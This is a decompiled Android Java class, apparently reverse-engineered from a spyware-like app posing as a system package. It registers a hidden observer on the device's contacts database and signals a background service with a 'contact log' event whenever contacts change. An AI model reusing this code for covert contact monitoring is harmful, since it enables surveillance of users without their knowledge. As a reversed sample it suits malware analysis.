package com.app.system.common.c;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.os.Handler;
import android.provider.ContactsContract.Data;
import com.app.system.common.service.EventsAndReceiveService;

public class c
  extends d
{
  public void a(Context paramContext)
  {
    b(paramContext);
  }
  
  public void b(final Context paramContext)
  {
    if (this.a == null)
    {
      this.a = new ContentObserver(null)
      {
        public void onChange(boolean paramAnonymousBoolean)
        {
          try
          {
            Intent localIntent = new android/content/Intent;
            localIntent.<init>(paramContext, EventsAndReceiveService.class);
            localIntent.putExtra("event_core_app", "event_contact_log");
            com.b.a.a.a.a(paramContext, localIntent);
          }
          catch (Exception localException)
          {
            com.security.d.a.d("ObContact", localException.getMessage(), new Object[0]);
          }
        }
      };
      paramContext.getContentResolver().registerContentObserver(ContactsContract.Data.CONTENT_URI, true, this.a);
    }
  }
  
  public void c(Context paramContext)
  {
    paramContext.getContentResolver().unregisterContentObserver(this.a);
    this.a = null;
  }
}


/* Location:              ~/com/app/system/common/c/c.class
 *
 * Reversed by:           J
 */